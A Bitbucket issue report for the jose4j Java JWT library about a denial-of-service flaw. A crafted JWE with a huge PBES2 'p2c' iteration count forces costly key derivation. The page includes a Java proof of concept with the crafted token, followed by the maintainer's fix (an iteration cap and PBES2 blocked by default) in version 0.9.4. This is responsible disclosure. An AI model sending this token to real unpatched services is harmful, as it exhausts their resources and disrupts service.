=== Content from bitbucket.org_365654a5_20250111_092740.html ===


1. [![Brian Campbell Avatar](https://bbc-object-storage--frontbucket.us-east-1.prod.public.atl-paas.net/91a722045772/img/default_workspace_avatar/workspace_code.svg)

   Brian Campbell](/b_c/)
2. [Untitled project](/b_c/workspace/projects/PROJ)
3. [jose4j](/b_c/jose4j)
4. [Issues](/b_c/jose4j/issues?status=new&status=open)

# Dos Attack Via specifically crafted JWE

Issue #212

[closed](/b_c/jose4j/issues?status=closed)

![](https://bbc-object-storage--frontbucket.us-east-1.prod.public.atl-paas.net/91a722045772/img/default_avatar/user_blue.svg)

Jesse Yang
created an issue
2023-12-03

## Description

The JWE key management algorithms based on PBKDF2 require a JOSE Header Parameter called p2c (PBES2 Count). This parameter dictates the number of PBKDF2 iterations needed to derive a CEK wrapping key. Its primary purpose is to intentionally slow down the key derivation function, making password brute-force and dictionary attacks more resource-intensive.

Therefore, if an attacker sets the p2c parameter in JWE to a very large number, it can cause a lot of computational consumption, resulting in a DOS attack

## POC

```
import org.jose4j.jwa.AlgorithmConstraints;
import org.jose4j.jwe.ContentEncryptionAlgorithmIdentifiers;
import org.jose4j.jwe.JsonWebEncryption;
import org.jose4j.jwe.KeyManagementAlgorithmIdentifiers;
import org.jose4j.keys.AesKey;
import org.jose4j.lang.ByteUtil;

import java.security.Key;

public class jwt {
    public static void main(String[] argc)throws Exception{
        Key key = new AesKey(ByteUtil.randomBytes(16));
        JsonWebEncryption jwe = new JsonWebEncryption();
        jwe.setAlgorithmConstraints(new AlgorithmConstraints(AlgorithmConstraints.ConstraintType.PERMIT,
                KeyManagementAlgorithmIdentifiers.PBES2_HS256_A128KW));
        jwe.setContentEncryptionAlgorithmConstraints(new AlgorithmConstraints(AlgorithmConstraints.ConstraintType.PERMIT,
                ContentEncryptionAlgorithmIdentifiers.AES_128_CBC_HMAC_SHA_256));
        jwe.setKey(key);
        jwe.setCompactSerialization("eyJhbGciOiJQQkVTMi1IUzI1NitBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwicDJjIjoyMDAwMDAwMDAwLCJwMnMiOiJ1RWxQUGhJLThGY2h3a1BhIn0=.JOIw8ccIdkor7-ZaHQz6pUkqj2VEL_XIuonOwdSrdeXxFb7qN8FZKw.1-ZgAG8KzCbl6wDjUzrsTw.0pLJ0ZEu9OMYV1jyfPIrqg.gFNkCEwB1lf_Jovc7ZOd5w");
        System.out.println("Payload: " + jwe.getPayload());
    }
}

```
## Recommendations

Set an upper limit for p2c, e.g. 100000.

## Comments (4)

1. ![](https://bbc-object-storage--frontbucket.us-east-1.prod.public.atl-paas.net/91a722045772/img/default_avatar/user_blue.svg)

   Jesse Yang
   reporter
   * marked as [critical](/b_c/jose4j/issues?priority=critical)
   * edited description
   * changed title to
     [Dos Attack Via specifically crafted JWE](/b_c/jose4j/issues?title=Dos+Attack+Via+specifically+crafted+JWE)
   * [2023-12-03T09:07:28+00:00](#comment-66222988 "Link directly to this comment")
2. ![](https://bbc-object-storage--frontbucket.us-east-1.prod.public.atl-paas.net/91a722045772/img/default_avatar/user_blue.svg)

   Brian Campbell
   repo owner
   * changed status to
     [open](/b_c/jose4j/issues?status=open)

   Thanks for raising this Jesse. I actually looked into this some a while back after this talk/white-paper[1] came out. The few production applications that I had access to were all using JWE AlgorithmConstraints such that they wouldn't even process a PBES2 JWE. So it didn't seem real urgent and I put it on the back burner intending to address it later. But honestly then sort of forgot about it. So thanks for bringing it back into the attention queue. The library should have some better default protections. Like a max p2c but also adding the PBES2 algs to default JWE AlgorithmConstraints to be blocked.

   [1] <https://i.blackhat.com/BH-US-23/Presentations/US-23-Tervoort-Three-New-Attacks-Against-JSON-Web-Tokens.pdf>

   <https://i.blackhat.com/BH-US-23/Presentations/US-23-Tervoort-Three-New-Attacks-Against-JSON-Web-Tokens-whitepaper.pdf>

   * [2023-12-04T14:41:56+00:00](#comment-66226641 "Link directly to this comment")
3. ![](https://bbc-object-storage--frontbucket.us-east-1.prod.public.atl-paas.net/91a722045772/img/default_avatar/user_blue.svg)

   Brian Campbell
   repo owner
   * changed status to
     [resolved](/b_c/jose4j/issues?status=resolved)

   Add the PBES2 algorithms to JWE's default blocked AlgorithmConstraints and put a max on the iteration count to fix Issue [~~#212~~](https://bitbucket.org/b_c/jose4j/issues/212/dos-attack-via-specifically-crafted-jwe "Dos Attack Via specifically crafted JWE")

   → <<cset [1afaa1e174b3](https://bitbucket.org/b_c/jose4j/commits/1afaa1e174b3)>>

   * [2023-12-05T21:19:00+00:00](#comment-66232846 "Link directly to this comment")
4. ![](https://bbc-object-storage--frontbucket.us-east-1.prod.public.atl-paas.net/91a722045772/img/default_avatar/user_blue.svg)

   Brian Campbell
   repo owner
   * changed status to
     [closed](/b_c/jose4j/issues?status=closed)

   jose4j-0.9.4 has the fix(s) for this

   * [2023-12-06T14:30:10+00:00](#comment-66235934 "Link directly to this comment")
5. [Log in to comment](/account/signin/?next=/b_c/jose4j/issues/212)

Assignee
–

Type
[bug](/b_c/jose4j/issues?kind=bug)

Priority
[critical](/b_c/jose4j/issues?priority=critical)

Status
[closed](/b_c/jose4j/issues?status=closed)

Votes
0

Watchers
3

[![Jira: the preferred issue tracker for Bitbucket. Join the team!](https://bbc-object-storage--frontbucket.us-east-1.prod.public.atl-paas.net/91a722045772/img/promos/jira-promo-issue.png)](https://www.atlassian.com/software/jira/bitbucket-integration?utm_source=bitbucket&utm_medium=in_product_ad&utm_campaign=bitbucket_issues&utm_content=issues_view)


